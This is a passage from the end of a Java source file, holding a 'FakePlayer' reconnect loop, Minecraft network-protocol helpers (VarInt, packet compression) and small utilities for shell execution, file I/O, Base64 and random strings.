                        System.out.println(ANSI_YELLOW + "[FakePlayer] Multiple failures (" + failCount +
                            "), waiting " + (waitTime / 1000) + "s..." + ANSI_RESET);
                    } else {
                        System.out.println(ANSI_YELLOW + "[FakePlayer] Reconnecting in 10s..." + ANSI_RESET);
                    }
                    Thread.sleep(waitTime);
                } catch (InterruptedException ex) { break; }
            }
        });
        fakePlayerThread.setDaemon(true);
        fakePlayerThread.start();
    }

    // ============ Minecraft 协议工具方法 ============
    private static int getVarIntSize(int value) {
        int size = 0;
        do { size++; value >>>= 7; } while (value != 0);
        return size;
    }

    private static void sendPacket(DataOutputStream out, byte[] packet, boolean compress, int threshold) throws IOException {
        if (!compress || packet.length < threshold) {
            if (compress) {
                ByteArrayOutputStream buf = new ByteArrayOutputStream();
                DataOutputStream bufOut = new DataOutputStream(buf);
                writeVarInt(bufOut, 0);
                bufOut.write(packet);
                byte[] finalPacket = buf.toByteArray();
                writeVarInt(out, finalPacket.length);
                out.write(finalPacket);
            } else {
                writeVarInt(out, packet.length);
                out.write(packet);
            }
        } else {
            byte[] compressedData = compressData(packet);
            ByteArrayOutputStream buf = new ByteArrayOutputStream();
            DataOutputStream bufOut = new DataOutputStream(buf);
            writeVarInt(bufOut, packet.length);
            bufOut.write(compressedData);
            byte[] finalPacket = buf.toByteArray();
            writeVarInt(out, finalPacket.length);
            out.write(finalPacket);
        }
        out.flush();
    }

    private static byte[] compressData(byte[] data) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        Deflater deflater = new Deflater();
        deflater.setInput(data);
        deflater.finish();
        byte[] buffer = new byte[1024];
        while (!deflater.finished()) {
            int count = deflater.deflate(buffer);
            out.write(buffer, 0, count);
        }
        deflater.end();
        return out.toByteArray();
    }

    private static void writeVarInt(DataOutputStream out, int value) throws IOException {
        while ((value & 0xFFFFFF80) != 0) {
            out.writeByte((value & 0x7F) | 0x80);
            value >>>= 7;
        }
        out.writeByte(value & 0x7F);
    }

    private static void writeString(DataOutputStream out, String str) throws IOException {
        byte[] bytes = str.getBytes("UTF-8");
        writeVarInt(out, bytes.length);
        out.write(bytes);
    }

    private static int readVarInt(DataInputStream in) throws IOException {
        int value = 0, length = 0;
        byte currentByte;
        do {
            currentByte = in.readByte();
            value |= (currentByte & 0x7F) << (length * 7);
            if (++length > 5) throw new IOException("VarInt too big");
        } while ((currentByte & 0x80) == 0x80);
        return value;
    }

    // ============ 通用工具方法 ============
    private static void sh(String cmd) throws Exception {
        Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
    }

    private static void writeFile(String path, String content) throws IOException {
        try (OutputStreamWriter w = new OutputStreamWriter(new FileOutputStream(path), StandardCharsets.UTF_8)) {
            w.write(content);
        }
    }

    private static String readFile(String path) throws IOException {
        return readStream(new FileInputStream(path));
    }

    private static String readStream(InputStream in) throws IOException {
        StringBuilder sb = new StringBuilder();
        try (BufferedReader r = new BufferedReader(new InputStreamReader(in, StandardCharsets.UTF_8))) {
            String line;
            while ((line = r.readLine()) != null) sb.append(line).append('\n');
        }
        return sb.toString();
    }

    private static String b64(String s) {
        return Base64.getEncoder().encodeToString(s.getBytes(StandardCharsets.UTF_8));
    }

    private static String rnd(int len) {
        String c = "abcdefghijklmnopqrstuvwxyz";
        StringBuilder sb = new StringBuilder();
        Random rng = new Random();
        for (int i = 0; i < len; i++) sb.append(c.charAt(rng.nextInt(c.length())));
        return sb.toString();
    }
}
